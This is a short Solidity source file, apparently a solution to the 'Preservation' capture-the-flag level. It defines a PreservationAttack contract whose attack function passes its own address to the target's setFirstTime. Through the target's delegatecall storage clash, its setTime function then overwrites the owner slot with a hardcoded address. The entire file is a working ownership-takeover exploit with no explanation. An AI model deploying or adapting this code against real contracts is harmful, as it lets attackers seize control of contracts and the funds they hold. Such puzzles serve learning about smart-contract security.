// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IPreservation{
     function setFirstTime(uint _timeStamp) external;
}
contract PreservationAttack {

  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 

  function attack(address _target) public {
      IPreservation(_target).setFirstTime(uint256(uint160(address(this))));
  }
  function setTime(uint _time) public {
    owner=0x83b26d6A3D3FaBd9F0A5f1d69DCA1CE6cc4eA39a;
  }
}
